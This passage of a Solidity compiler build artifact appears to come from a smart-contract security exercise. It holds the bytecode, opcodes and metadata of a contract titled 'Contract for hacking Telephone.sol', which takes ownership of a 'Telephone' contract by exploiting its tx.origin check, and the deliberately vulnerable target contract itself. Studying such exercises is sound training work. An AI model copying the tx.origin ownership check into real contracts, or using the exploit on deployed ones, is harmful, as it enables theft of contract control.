                  "contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n}\n",
                  "id": 4,
                  "language": "Yul",
                  "name": "#utility.yul"
                }
              ],
              "immutableReferences": {},
              "linkReferences": {},
              "object": "608060405234801561001057600080fd5b506004361061002b5760003560e01c8063a6f9dae114610030575b600080fd5b61004a600480360381019061004591906101c4565b61004c565b005b6100787f95ddb175a1fdc37c4399f4d8e36ff5783af8bae0c041fc49d1707d6fab60ed1860001b61015e565b6100a47fa4d14fb052b99e90be993b3e9692be1f0ee653e938c08ccda4f1cf48bda729a360001b61015e565b6100d07f336c7e84867c4841e1137bec080607d657aad78e0f123e2d8e7d6c01479d129560001b61015e565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1826040518263ffffffff1660e01b81526004016101299190610200565b600060405180830381600087803b15801561014357600080fd5b505af1158015610157573d6000803e3d6000fd5b5050505050565b50565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061019182610166565b9050919050565b6101a181610186565b81146101ac57600080fd5b50565b6000813590506101be81610198565b92915050565b6000602082840312156101da576101d9610161565b5b60006101e8848285016101af565b91505092915050565b6101fa81610186565b82525050565b600060208201905061021560008301846101f1565b9291505056fea2646970667358221220362fb8974b07651a92985b1a5315072c8858456be27f704a60597b697d538cdb64736f6c634300080a0033",
              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xA6F9DAE1 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x45 SWAP2 SWAP1 PUSH2 0x1C4 JUMP JUMPDEST PUSH2 0x4C JUMP JUMPDEST STOP JUMPDEST PUSH2 0x78 PUSH32 0x95DDB175A1FDC37C4399F4D8E36FF5783AF8BAE0C041FC49D1707D6FAB60ED18 PUSH1 0x0 SHL PUSH2 0x15E JUMP JUMPDEST PUSH2 0xA4 PUSH32 0xA4D14FB052B99E90BE993B3E9692BE1F0EE653E938C08CCDA4F1CF48BDA729A3 PUSH1 0x0 SHL PUSH2 0x15E JUMP JUMPDEST PUSH2 0xD0 PUSH32 0x336C7E84867C4841E1137BEC080607D657AAD78E0F123E2D8E7D6C01479D1295 PUSH1 0x0 SHL PUSH2 0x15E JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA6F9DAE1 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x129 SWAP2 SWAP1 PUSH2 0x200 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x143 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x157 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x191 DUP3 PUSH2 0x166 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1A1 DUP2 PUSH2 0x186 JUMP JUMPDEST DUP2 EQ PUSH2 0x1AC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x1BE DUP2 PUSH2 0x198 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x1DA JUMPI PUSH2 0x1D9 PUSH2 0x161 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1E8 DUP5 DUP3 DUP6 ADD PUSH2 0x1AF JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x1FA DUP2 PUSH2 0x186 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x215 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1F1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CALLDATASIZE 0x2F 0xB8 SWAP8 0x4B SMOD PUSH6 0x1A92985B1A53 ISZERO SMOD 0x2C DUP9 PC GASLIMIT PUSH12 0xE27F704A60597B697D538CDB PUSH5 0x736F6C6343 STOP ADDMOD EXP STOP CALLER ",
              "sourceMap": "581:935:2:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1130:383;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;1175:80;1188:66;1175:80;;:12;:80::i;:::-;1275;1288:66;1275:80;;:12;:80::i;:::-;1377;1390:66;1377:80;;:12;:80::i;:::-;1476:9;;;;;;;;;;:21;;;1498:6;1476:29;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1130:383;:::o;606:61::-;;:::o;88:117:4:-;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:139::-;742:5;780:6;767:20;758:29;;796:33;823:5;796:33;:::i;:::-;696:139;;;;:::o;841:329::-;900:6;949:2;937:9;928:7;924:23;920:32;917:119;;;955:79;;:::i;:::-;917:119;1075:1;1100:53;1145:7;1136:6;1125:9;1121:22;1100:53;:::i;:::-;1090:63;;1046:117;841:329;;;;:::o;1176:118::-;1263:24;1281:5;1263:24;:::i;:::-;1258:3;1251:37;1176:118;;:::o;1300:222::-;1393:4;1431:2;1420:9;1416:18;1408:26;;1444:71;1512:1;1501:9;1497:17;1488:6;1444:71;:::i;:::-;1300:222;;;;:::o"
            },
            "methodIdentifiers": {
              "changeOwner(address)": "a6f9dae1"
            }
          },
          "metadata": "{\"compiler\":{\"version\":\"0.8.10+commit.fc410830\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"changeOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"author\":\"Pedro Reyes\",\"custom:link\":\"https://docs.soliditylang.org/en/v0.8.15/units-and-global-variables.html?highlight=tx.origin#block-and-transaction-propertieshttps://docs.soliditylang.org/en/v0.8.15/security-considerations.html?highlight=tx.origin#tx-originhttps://ethereum.stackexchange.com/questions/196/how-do-i-make-my-dapp-serenity-proof\",\"kind\":\"dev\",\"methods\":{\"changeOwner(address)\":{\"details\":\"Change the owner of the telephone.\"}},\"title\":\"Contract for hacking Telephone.sol\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/4_Telephone/HackTelephone.sol\":\"HackTelephone\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":1000},\"remappings\":[]},\"sources\":{\"contracts/4_Telephone/HackTelephone.sol\":{\"keccak256\":\"0x36ca3c5507ff9d9b78da6711775cb23a6ab07db795f8337c6485858085fe038d\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://6583dcf02f590c00e7a0e0ed9a3f17be33b2edfdce0a31481a3ae19ace4a6d00\",\"dweb:/ipfs/QmeAmZWYMRc7z8Yd59aFYTRQvZ3ac19bEfVYCB92fc7reT\"]},\"contracts/4_Telephone/Telephone.sol\":{\"keccak256\":\"0xf746b8f1f615dc9b5bc7b491b80f8901d9d00a01a463705b8b0a3fde0d2474d0\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://dcd31627cda8111364aacdf138af0a60399424917f6069adce7f040c3995a9be\",\"dweb:/ipfs/QmQ7Cnf7EYEWzgq2FoHGrszw5rX4wxuaR9ad41E7zd3U6m\"]}},\"version\":1}"
        }
      },
      "contracts/4_Telephone/Telephone.sol": {
        "Telephone": {
          "abi": [
            {
              "inputs": [],
              "stateMutability": "nonpayable",
              "type": "constructor"
            },
            {
              "inputs": [
                {
                  "internalType": "address",
                  "name": "_owner",
                  "type": "address"
                }
              ],
              "name": "changeOwner",
              "outputs": [],
              "stateMutability": "nonpayable",
              "type": "function"
            },
            {
              "inputs": [],
              "name": "owner",
              "outputs": [
                {
                  "internalType": "address",
                  "name": "",
                  "type": "address"
                }
              ],
              "stateMutability": "view",
              "type": "function"
            }
          ],
          "evm": {
            "bytecode": {
              "functionDebugData": {
                "@_281": {
                  "entryPoint": null,
                  "id": 281,
                  "parameterSlots": 0,
                  "returnSlots": 0
                },
                "@c_0xac82e904_258": {
                  "entryPoint": 236,
                  "id": 258,
                  "parameterSlots": 1,
                  "returnSlots": 0
                }
              },
              "generatedSources": [],
              "linkReferences": {},
              "object": "608060405234801561001057600080fd5b506100437fcfa6c3657c9b51c2b92df51b0179095cc76f9cc62f2220cb267146ef0c109a8760001b6100ec60201b60201c565b6100757f11d8d083dcdfc7bd89cc6f601b27cc46a1e80e10fae9a9ebfffc5e0b0d1e560d60001b6100ec60201b60201c565b6100a77f8383dccdcabd64071ad71b30887a7a28bfc70ae6717caa71b644786faa072cc660001b6100ec60201b60201c565b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506100ef565b50565b61033c806100fe6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80638da5cb5b1461003b578063a6f9dae114610059575b600080fd5b610043610075565b604051610050919061028d565b60405180910390f35b610073600480360381019061006e91906102d9565b610099565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6100c57f38129285ef6b951be267187da0a3976f3236fef5d6c410783ffc2bece4648a8760001b610249565b6100f17ffa3db312605afcf5202006c41f66c777015f723b2f085cf690d0de1f2806d7dd60001b610249565b61011d7fb1e5e0c2ba09d6443ec30f0e6e4e0ca0dd8ecabe7e15aa3f12da193aafd3645660001b610249565b3373ffffffffffffffffffffffffffffffffffffffff163273ffffffffffffffffffffffffffffffffffffffff16146102195761017c7f22f7d2abe44d6053a3243d9d9d2f4426aad098dbe1cb271911ed6507fbfaad6060001b610249565b6101a87f19de63b7782c281e196d7d5d8f246109d381ed54bb991c48e259fc1a7638146e60001b610249565b6101d47f76bbb05eaa8aebb25d0ad81375425536dfd3cba526694262c820abbcacf8562460001b610249565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610246565b6102457f9af4fefc324f1fdb166748644e640a9e04f1064999de7cea303fb012561dd24660001b610249565b5b50565b50565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006102778261024c565b9050919050565b6102878161026c565b82525050565b60006020820190506102a2600083018461027e565b92915050565b600080fd5b6102b68161026c565b81146102c157600080fd5b50565b6000813590506102d3816102ad565b92915050565b6000602082840312156102ef576102ee6102a8565b5b60006102fd848285016102c4565b9150509291505056fea26469706673582212204c6cc8711c043ee4f126170e6f1b18af579bd01887ed69aa561e9ee25e7b415164736f6c634300080a0033",
              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x43 PUSH32 0xCFA6C3657C9B51C2B92DF51B0179095CC76F9CC62F2220CB267146EF0C109A87 PUSH1 0x0 SHL PUSH2 0xEC PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH2 0x75 PUSH32 0x11D8D083DCDFC7BD89CC6F601B27CC46A1E80E10FAE9A9EBFFFC5E0B0D1E560D PUSH1 0x0 SHL PUSH2 0xEC PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST PUSH2 0xA7 PUSH32 0x8383DCCDCABD64071AD71B30887A7A28BFC70AE6717CAA71B644786FAA072CC6 PUSH1 0x0 SHL PUSH2 0xEC PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0xEF JUMP JUMPDEST POP JUMP JUMPDEST PUSH2 0x33C DUP1 PUSH2 0xFE PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xA6F9DAE1 EQ PUSH2 0x59 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x75 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x28D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x6E SWAP2 SWAP1 PUSH2 0x2D9 JUMP JUMPDEST PUSH2 0x99 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH2 0xC5 PUSH32 0x38129285EF6B951BE267187DA0A3976F3236FEF5D6C410783FFC2BECE4648A87 PUSH1 0x0 SHL PUSH2 0x249 JUMP JUMPDEST PUSH2 0xF1 PUSH32 0xFA3DB312605AFCF5202006C41F66C777015F723B2F085CF690D0DE1F2806D7DD PUSH1 0x0 SHL PUSH2 0x249 JUMP JUMPDEST PUSH2 0x11D PUSH32 0xB1E5E0C2BA09D6443EC30F0E6E4E0CA0DD8ECABE7E15AA3F12DA193AAFD36456 PUSH1 0x0 SHL PUSH2 0x249 JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND ORIGIN PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x219 JUMPI PUSH2 0x17C PUSH32 0x22F7D2ABE44D6053A3243D9D9D2F4426AAD098DBE1CB271911ED6507FBFAAD60 PUSH1 0x0 SHL PUSH2 0x249 JUMP JUMPDEST PUSH2 0x1A8 PUSH32 0x19DE63B7782C281E196D7D5D8F246109D381ED54BB991C48E259FC1A7638146E PUSH1 0x0 SHL PUSH2 0x249 JUMP JUMPDEST PUSH2 0x1D4 PUSH32 0x76BBB05EAA8AEBB25D0AD81375425536DFD3CBA526694262C820ABBCACF85624 PUSH1 0x0 SHL PUSH2 0x249 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0x246 JUMP JUMPDEST PUSH2 0x245 PUSH32 0x9AF4FEFC324F1FDB166748644E640A9E04F1064999DE7CEA303FB012561DD246 PUSH1 0x0 SHL PUSH2 0x249 JUMP JUMPDEST JUMPDEST POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x277 DUP3 PUSH2 0x24C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x287 DUP2 PUSH2 0x26C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2A2 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x27E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2B6 DUP2 PUSH2 0x26C JUMP JUMPDEST DUP2 EQ PUSH2 0x2C1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x2D3 DUP2 PUSH2 0x2AD JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2EF JUMPI PUSH2 0x2EE PUSH2 0x2A8 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2FD DUP5 DUP3 DUP6 ADD PUSH2 0x2C4 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x4C PUSH13 0xC8711C043EE4F126170E6F1B18 0xAF JUMPI SWAP12 0xD0 XOR DUP8 0xED PUSH10 0xAA561E9EE25E7B415164 PUSH20 0x6F6C634300080A00330000000000000000000000 ",
              "sourceMap": "114:1287:3:-:0;;;232:342;;;;;;;;;;247:80;260:66;247:80;;:12;;;:80;;:::i;:::-;347;360:66;347:80;;:12;;;:80;;:::i;:::-;449;462:66;449:80;;:12;;;:80;;:::i;:::-;556:10;548:5;;:18;;;;;;;;;;;;;;;;;;114:1287;;135:61;;:::o;114:1287::-;;;;;;;"
            },
            "deployedBytecode": {
              "functionDebugData": {
                "@c_0xac82e904_258": {
                  "entryPoint": 585,
                  "id": 258,
                  "parameterSlots": 1,
                  "returnSlots": 0
                },
                "@changeOwner_327": {
                  "entryPoint": 153,
                  "id": 327,
                  "parameterSlots": 1,
                  "returnSlots": 0
                },
                "@owner_260": {
                  "entryPoint": 117,
                  "id": 260,
                  "parameterSlots": 0,
                  "returnSlots": 0
                },
                "abi_decode_t_address": {
                  "entryPoint": 708,
                  "id": null,
                  "parameterSlots": 2,
                  "returnSlots": 1
                },
                "abi_decode_tuple_t_address": {
                  "entryPoint": 729,
                  "id": null,
                  "parameterSlots": 2,
                  "returnSlots": 1
                },
                "abi_encode_t_address_to_t_address_fromStack": {
                  "entryPoint": 638,
                  "id": null,
                  "parameterSlots": 2,
                  "returnSlots": 0
                },
                "abi_encode_tuple_t_address__to_t_address__fromStack_reversed": {
                  "entryPoint": 653,
                  "id": null,
                  "parameterSlots": 2,
                  "returnSlots": 1
                },
                "allocate_unbounded": {
                  "entryPoint": null,
                  "id": null,
                  "parameterSlots": 0,
                  "returnSlots": 1
                },
                "cleanup_t_address": {
                  "entryPoint": 620,
                  "id": null,
                  "parameterSlots": 1,
                  "returnSlots": 1
                },
                "cleanup_t_uint160": {
                  "entryPoint": 588,
                  "id": null,
                  "parameterSlots": 1,
                  "returnSlots": 1
                },
                "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
                  "entryPoint": null,
                  "id": null,
                  "parameterSlots": 0,
                  "returnSlots": 0
                },
                "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
                  "entryPoint": 680,
                  "id": null,
                  "parameterSlots": 0,
                  "returnSlots": 0
                },
                "validator_revert_t_address": {
                  "entryPoint": 685,
                  "id": null,
                  "parameterSlots": 1,
                  "returnSlots": 0
                }
              },
              "generatedSources": [
                {
                  "ast": {
                    "nodeType": "YulBlock",
                    "src": "0:1525:4",
                    "statements": [
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "52:81:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "62:65:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "value",
                                    "nodeType": "YulIdentifier",
                                    "src": "77:5:4"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "84:42:4",
                                    "type": "",
                                    "value": "0xffffffffffffffffffffffffffffffffffffffff"
                                  }
                                ],
                                "functionName": {
                                  "name": "and",
                                  "nodeType": "YulIdentifier",
                                  "src": "73:3:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "73:54:4"
                              },
                              "variableNames": [
                                {
                                  "name": "cleaned",
                                  "nodeType": "YulIdentifier",
                                  "src": "62:7:4"
                                }
                              ]
                            }
                          ]
                        },
                        "name": "cleanup_t_uint160",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "34:5:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "cleaned",
                            "nodeType": "YulTypedName",
                            "src": "44:7:4",
                            "type": ""
                          }
                        ],
                        "src": "7:126:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "184:51:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "194:35:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "value",
                                    "nodeType": "YulIdentifier",
                                    "src": "223:5:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "cleanup_t_uint160",
                                  "nodeType": "YulIdentifier",
                                  "src": "205:17:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "205:24:4"
                              },
                              "variableNames": [
                                {
                                  "name": "cleaned",
                                  "nodeType": "YulIdentifier",
                                  "src": "194:7:4"
                                }
                              ]
                            }
                          ]
                        },
                        "name": "cleanup_t_address",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "166:5:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "cleaned",
                            "nodeType": "YulTypedName",
                            "src": "176:7:4",
                            "type": ""
                          }
                        ],
                        "src": "139:96:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "306:53:4",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "name": "pos",
                                    "nodeType": "YulIdentifier",
                                    "src": "323:3:4"
                                  },
                                  {
                                    "arguments": [
                                      {
                                        "name": "value",
                                        "nodeType": "YulIdentifier",
                                        "src": "346:5:4"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "cleanup_t_address",
                                      "nodeType": "YulIdentifier",
                                      "src": "328:17:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "328:24:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "mstore",
                                  "nodeType": "YulIdentifier",
                                  "src": "316:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "316:37:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "316:37:4"
                            }
                          ]
                        },
                        "name": "abi_encode_t_address_to_t_address_fromStack",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "294:5:4",
                            "type": ""
                          },
                          {
                            "name": "pos",
                            "nodeType": "YulTypedName",
                            "src": "301:3:4",
                            "type": ""
                          }
                        ],
                        "src": "241:118:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "463:124:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "473:26:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "headStart",
                                    "nodeType": "YulIdentifier",
                                    "src": "485:9:4"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "496:2:4",
                                    "type": "",
                                    "value": "32"
                                  }
                                ],
                                "functionName": {
                                  "name": "add",
                                  "nodeType": "YulIdentifier",
                                  "src": "481:3:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "481:18:4"
                              },
                              "variableNames": [
                                {
                                  "name": "tail",
                                  "nodeType": "YulIdentifier",
                                  "src": "473:4:4"
                                }
                              ]
                            },
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "name": "value0",
                                    "nodeType": "YulIdentifier",
                                    "src": "553:6:4"
                                  },
                                  {
                                    "arguments": [
                                      {
                                        "name": "headStart",
                                        "nodeType": "YulIdentifier",
                                        "src": "566:9:4"
                                      },
                                      {
                                        "kind": "number",
                                        "nodeType": "YulLiteral",
                                        "src": "577:1:4",
                                        "type": "",
                                        "value": "0"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "add",
                                      "nodeType": "YulIdentifier",
                                      "src": "562:3:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "562:17:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "abi_encode_t_address_to_t_address_fromStack",
                                  "nodeType": "YulIdentifier",
                                  "src": "509:43:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "509:71:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "509:71:4"
                            }
                          ]
                        },
                        "name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "headStart",
                            "nodeType": "YulTypedName",
                            "src": "435:9:4",
                            "type": ""
                          },
                          {
                            "name": "value0",
                            "nodeType": "YulTypedName",
                            "src": "447:6:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "tail",
                            "nodeType": "YulTypedName",
                            "src": "458:4:4",
                            "type": ""
                          }
                        ],
                        "src": "365:222:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "633:35:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "643:19:4",
                              "value": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "659:2:4",
                                    "type": "",
                                    "value": "64"
                                  }
                                ],
                                "functionName": {
                                  "name": "mload",
                                  "nodeType": "YulIdentifier",
                                  "src": "653:5:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "653:9:4"
                              },
                              "variableNames": [
                                {
                                  "name": "memPtr",
                                  "nodeType": "YulIdentifier",
                                  "src": "643:6:4"
                                }
                              ]
                            }
                          ]
                        },
                        "name": "allocate_unbounded",
                        "nodeType": "YulFunctionDefinition",
                        "returnVariables": [
